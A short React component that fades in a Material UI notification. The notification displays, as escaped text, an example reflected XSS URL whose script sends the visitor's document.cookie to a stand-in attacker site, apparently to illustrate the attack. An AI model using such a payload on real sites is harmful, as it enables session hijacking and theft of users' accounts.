import React, { useState, useEffect } from 'react';
import { Paper, Typography } from '@mui/material';

const NotificationMessage: React.FC = () => {
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setVisible(true);
    }, 1500);
    return () => clearTimeout(timer);
  }, []);

  return (
    <Paper
      sx={{
        p: 2,
        mb: 2,
        backgroundColor: 'lightblue',
        display: 'inline-block',
        opacity: visible ? 1 : 0,
        transition: 'opacity 1s ease-in-out',
      }}
    >
      <Typography variant="body1" color="white">
        www.welp.com?<br />
        search=&lt;script&gt;window.location='www.haxxed.com?<br />
        cookie='+document.cookie&lt;/script&gt;
      </Typography>
    </Paper>
  );
};

export default NotificationMessage;
